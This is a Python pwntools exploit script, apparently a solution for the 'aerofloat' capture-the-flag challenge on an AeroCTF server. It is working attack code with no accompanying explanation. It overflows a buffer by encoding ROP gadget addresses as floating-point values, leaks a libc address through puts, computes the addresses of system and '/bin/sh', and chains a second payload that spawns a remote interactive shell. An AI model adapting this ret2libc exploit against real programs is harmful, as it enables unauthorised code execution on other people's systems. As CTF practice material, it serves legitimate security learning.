from pwn import *
import struct

#p=process("./aerofloat")
p=remote("tasks.aeroctf.com", 33017)
p.sendline("thamer")
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recv()
for i in range(12):

	p.sendline("1")
	p.recv()
	p.sendline("1")
	p.recv()
	p.sendline("123456")
	p.recv()

pop_rdi="4015bb"
puts_plt="401030"
libc_main_got="403ff0"
ret="401016"
entry="4010b0"
p.sendline("1")
p.recv()
p.sendline("BBBB")
p.recv()
payload=str(struct.unpack("<d", struct.pack("Q",int("0x"+pop_rdi, 16)))[0])
p.sendline(payload)
p.recv()

p.sendline("1")
p.recv()
p.sendline(p64(int(libc_main_got,16)))
p.recv()
payload=str(struct.unpack("<d", struct.pack("Q",int("0x"+puts_plt, 16)))[0])
p.sendline(payload)
p.recv()

p.sendline("1")
p.recv()
p.sendline(p64(int(entry,16)))
p.recv()
payload=str(struct.unpack("<d", struct.pack("Q",int("0x"+puts_plt, 16)))[0])
p.sendline(payload)
p.recv()

p.sendline("4")
data=p.recvline()[:-1]
print data
for i in data:
	print hex(ord(i))
leak=u64(data.ljust(8,"\x00"))
base=leak-0x26ad0
system=base+0x46ff0
binsh=base+0x1b3e9a
print "leak :",hex(leak)
print "system :",hex(system)
print "binsh :",hex(binsh)
name="4040c0"

p.sendline("/bin/sh\x00")
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recv()
for i in range(12):

	p.sendline("1")
	p.recv()
	p.sendline("1")
	p.recv()
	p.sendline("123456")
	p.recv()


p.sendline("1")
p.recv()
p.sendline("BBBB")
p.recv()
payload=str(struct.unpack("<d", struct.pack("Q",int("0x"+ret, 16)))[0])
p.sendline(payload)
p.recv()

p.sendline("1")
p.recv()
p.sendline(p64(int(pop_rdi,16)))
p.recv()
payload=str(struct.unpack("<d", struct.pack("Q",int("0x"+name, 16)))[0])
p.sendline(payload)
p.recv()

p.sendline("1")
p.recv()
p.sendline(p64(system))
p.recv()
payload=str(struct.unpack("<d", struct.pack("Q",int("0x"+hex(system)[2:], 16)))[0])
p.sendline(payload)
p.recv()
pause()
p.sendline("4")
p.interactive()


#print p.recvuntil("Exit")
"""
p.sendline("1")
p.sendline("1")
p.sendline("123")

p.sendline("2")
print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()

"""






















